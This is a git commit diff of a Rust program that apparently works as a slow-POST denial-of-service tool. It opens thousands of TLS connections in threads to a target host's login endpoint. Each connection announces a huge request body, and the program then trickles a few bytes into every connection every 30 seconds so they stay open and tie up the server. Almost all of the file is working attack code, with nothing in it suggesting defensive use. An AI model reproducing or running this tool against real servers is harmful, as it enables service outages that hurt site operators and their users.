2348c410becf78aa13a10284ddd2a35eb5272cb9
Andrey Voronkov <andrey.voronkov@medm.com>
2017-05-18 18:11:04 +0300

    Works with threads.

--- src/main.rs
+++ src/main.rs
@@ -1,46 +1,59 @@
-extern crate futures;
 extern crate native_tls;
-
-extern crate tokio_core;
-extern crate tokio_timer;
-
 use native_tls::TlsConnector;
 use std::env;
 use std::io::Write;
 use std::net::TcpStream;
-use std::time::Duration;
-
-use futures::*;
-use tokio_timer::*;
-use tokio_core::reactor::{ Core, Interval };
+use std::thread;
+use std::time::{Duration, Instant};
+use std::sync::{Arc, Mutex};
 
 fn main() {
     let host = env::var("HOST").unwrap();
     let port = "443";
-    let timeout = 50;
+    let batches_count = 4;
     let connections_count = 2048;
+    let timeout = 30;
 
-    let mut core = Core::new().unwrap();
-    let handle = core.handle();
-    let mut index = 0;
-    let runner = Timer::default().interval(Duration::from_secs(1)).for_each(move |_| {
-        if index >= connections_count { return Ok(()) };
-        let start = format!("POST /api/v3/user/login HTTP/1.1\r\nContent-Type: application/x-www-form-urlencoded\r\nHost: {}\r\nContent-Length: 1000000\r\n\r\n", host);
-        let connector = TlsConnector::builder().unwrap().build().unwrap();
-        let stream = TcpStream::connect(format!("{}:{}", host, port)).unwrap();
-        let mut stream = connector.connect(&host, stream).unwrap();
-        stream.write(start.as_bytes());
+    let mut streams_batches = Vec::with_capacity(batches_count);
+    for batch_number in 0..batches_count {
+        let connections_count = connections_count / batches_count;
+        let host = host.to_owned();
 
-        let timer = Timer::default().interval(Duration::from_secs(timeout)).for_each(move |_| {
-            stream.write(b"a");
-            stream.flush();
-            println!("Stream number: {} written.", index);
-            Ok(())
+        let true_streams = Arc::new(Mutex::new(Vec::with_capacity(connections_count)));
+        let streams = true_streams.to_owned();
+        streams_batches.push(true_streams);
+
+        let _connections_producer = thread::spawn(move || {
+            let now = Instant::now();
+            let start = format!("POST /api/v3/user/login HTTP/1.1\r\nContent-Type: application/x-www-form-urlencoded\r\nHost: {}\r\nContent-Length: 10000000\r\n\r\nemail=", host);
+            for connection_number in 0.. {
+                let connector = TlsConnector::builder().unwrap().build().unwrap();
+                let stream = TcpStream::connect(format!("{}:{}", host, port)).unwrap();
+                let mut stream = connector.connect(&host, stream).unwrap();
+                let _ = stream.write(start.as_bytes());
+                let _ = stream.flush();
+                streams.lock().unwrap().push(stream);
+                println!("Elapsed: {} seconds. Thread: {}. Connection {} has been spawned.", now.elapsed().as_secs(), batch_number, connection_number);
+            }
         });
-        handle.spawn(timer.map_err(|_| ()));
-        println!("Stream number: {} spawned.", index);
-        index += 1;
-        Ok(())
-    });
-    core.run(runner);
+    }
+
+    for (batch_number, true_streams) in streams_batches.iter().enumerate() {
+        let streams = true_streams.to_owned();
+        let now = Instant::now();
+        let _feeder = thread::spawn(move || {
+            loop {
+                thread::sleep(Duration::from_secs(timeout));
+                let mut locked = streams.lock().unwrap();
+                let streams_count = locked.len();
+                for (_index, stream) in locked.iter_mut().enumerate() {
+                    let _ = stream.write(b"a=b&");
+                    let _ = stream.flush();
+                }
+                println!("Elapsed: {} seconds. Thread: {}. Done feeding {} streams.", now.elapsed().as_secs(), batch_number, streams_count);
+            }
+        });
+    }
+
+    loop {}
 }
